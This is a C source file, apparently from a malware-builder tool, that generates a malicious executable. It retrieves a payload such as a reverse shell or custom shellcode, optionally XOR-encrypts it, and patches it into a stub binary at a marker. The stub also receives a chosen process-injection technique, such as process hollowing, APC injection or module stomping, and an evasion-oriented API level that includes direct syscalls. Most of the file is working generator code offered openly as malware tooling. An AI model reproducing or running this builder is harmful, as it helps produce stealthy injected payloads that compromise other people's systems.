#include "generator.h"
#include "payloads/payloads.h"
#include <stdio.h>
#include <stdlib.h>

#define PAYLOAD_MARKER 0xDEADBEEF

BYTE GetTechniqueIndex(InjectionTechnique technique) {
    switch (technique) {
    case INJECTION_CREATE_REMOTE_THREAD: return 0;
    case INJECTION_APC: return 1;
    case INJECTION_THREAD_HIJACKING: return 2;
    case INJECTION_PROCESS_HOLLOWING: return 3;
    case INJECTION_STOMPING: return 4;
    default: return 0;
    }
}

BOOL GetStubPath(const MalgenConfig* config, CHAR* stub_path) {
    const CHAR* api_name;
    CHAR exe_dir[MAX_PATH];
    CHAR* last_slash;

    switch (config->api_level) {
    case API_WINAPI:
        api_name = "winapi";
        break;
    case API_NTDLL:
        api_name = "ntdll";
        break;
    case API_SYSCALLS:
        api_name = "syscalls";
        break;
    default:
        api_name = "winapi";
        break;
    }

    GetModuleFileNameA(NULL, exe_dir, MAX_PATH);
    last_slash = strrchr(exe_dir, '\\');
    if (last_slash) {
        *(last_slash + 1) = '\0';
    }

    sprintf_s(stub_path, MAX_PATH_LEN, "%s..\\..\\src\\stubs\\stub_%s.exe", exe_dir, api_name);
    return TRUE;
}

BOOL PatchBinary(const MalgenConfig* config, LPVOID payload, SIZE_T payload_size) {
    HANDLE hStub, hOutput;
    DWORD stub_size, bytes_read, bytes_written;
    LPBYTE stub_data;
    DWORD i, marker_offset = 0;
    DWORD marker = PAYLOAD_MARKER;
    BOOL found = FALSE;
    CHAR stub_path[MAX_PATH_LEN];

    GetStubPath(config, stub_path);

    hStub = CreateFileA(stub_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hStub == INVALID_HANDLE_VALUE) {
        printf("stub not found: %s\n", stub_path);
        printf("stubs must be built first\n");
        return FALSE;
    }

    stub_size = GetFileSize(hStub, NULL);
    stub_data = (LPBYTE)malloc(stub_size + payload_size);
    if (!stub_data) {
        CloseHandle(hStub);
        return FALSE;
    }

    if (!ReadFile(hStub, stub_data, stub_size, &bytes_read, NULL)) {
        printf("failed to read stub\n");
        free(stub_data);
        CloseHandle(hStub);
        return FALSE;
    }
    CloseHandle(hStub);

    for (i = 0; i < stub_size - sizeof(DWORD); i++) {
        if (*(DWORD*)(stub_data + i) == marker) {
            marker_offset = i;
            found = TRUE;
            break;
        }
    }

    if (!found) {
        printf("payload marker not found in stub\n");
        free(stub_data);
        return FALSE;
    }

    *(DWORD*)(stub_data + marker_offset) = (DWORD)payload_size;
    memcpy(stub_data + marker_offset + sizeof(DWORD), payload, payload_size);

    if (config->encryption == ENCRYPTION_XOR) {
        *(stub_data + marker_offset + sizeof(DWORD) + MAX_PAYLOAD_SIZE) = config->xor_key;
    }

    *(stub_data + marker_offset + sizeof(DWORD) + MAX_PAYLOAD_SIZE + 1) = GetTechniqueIndex(config->injection);

    memcpy(stub_data + marker_offset + sizeof(DWORD) + MAX_PAYLOAD_SIZE + 2,
           config->target.process_name, strlen(config->target.process_name) + 1);

    hOutput = CreateFileA(config->output_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
    if (hOutput == INVALID_HANDLE_VALUE) {
        printf("failed to create output\n");
        free(stub_data);
        return FALSE;
    }

    if (!WriteFile(hOutput, stub_data, stub_size, &bytes_written, NULL)) {
        printf("failed to write output\n");
        CloseHandle(hOutput);
        free(stub_data);
        return FALSE;
    }

    CloseHandle(hOutput);
    free(stub_data);

    return TRUE;
}

VOID PrintConfigSummary(const MalgenConfig* config) {
    printf("configuration summary:\n");

    printf("\tpayload: ");
    switch (config->payload_type) {
    case PAYLOAD_CALC: printf("calc.exe\n"); break;
    case PAYLOAD_REVERSE_SHELL: printf("reverse shell\n"); break;
    case PAYLOAD_CUSTOM_SHELLCODE: printf("custom shellcode\n"); break;
    }

    printf("\tencryption: ");
    switch (config->encryption) {
    case ENCRYPTION_NONE: printf("none\n"); break;
    case ENCRYPTION_XOR: printf("XOR (key: 0x%02X)\n", config->xor_key); break;
    case ENCRYPTION_AES: printf("AES-256\n"); break;
    }

    printf("\tinjection: ");
    switch (config->injection) {
    case INJECTION_CREATE_REMOTE_THREAD: printf("CreateRemoteThread\n"); break;
    case INJECTION_APC: printf("APC injection\n"); break;
    case INJECTION_THREAD_HIJACKING: printf("thread hijacking\n"); break;
    case INJECTION_PROCESS_HOLLOWING: printf("process hollowing\n"); break;
    case INJECTION_STOMPING: printf("module stomping\n"); break;
    }

    printf("\tAPI level: ");
    switch (config->api_level) {
    case API_WINAPI: printf("WinAPI\n"); break;
    case API_NTDLL: printf("ntdll\n"); break;
    case API_SYSCALLS: printf("direct syscalls\n"); break;
    }

    printf("\ttarget: %s\n", config->target.process_name);
}

BOOL GenerateMalware(const MalgenConfig* config) {
    LPVOID payload;
    SIZE_T payload_size;

    PrintConfigSummary(config);

    printf("\nretrieving payload\n");
    if (!GetPayload(config->payload_type, &payload, &payload_size)) {
        printf("failed to get payload\n");
        return FALSE;
    }

    printf("payload size: %zu bytes\n", payload_size);

    if (config->encryption == ENCRYPTION_XOR) {
        SIZE_T i;
        printf("encrypting payload with XOR...\n");
        for (i = 0; i < payload_size; i++) {
            ((BYTE*)payload)[i] ^= config->xor_key;
        }
        printf("payload encrypted\n");
    }

    printf("patching stub binary\n");
    if (!PatchBinary(config, payload, payload_size)) {
        free(payload);
        return FALSE;
    }

    free(payload);
    printf("binary generated: %s\n", config->output_path);
    return TRUE;
}
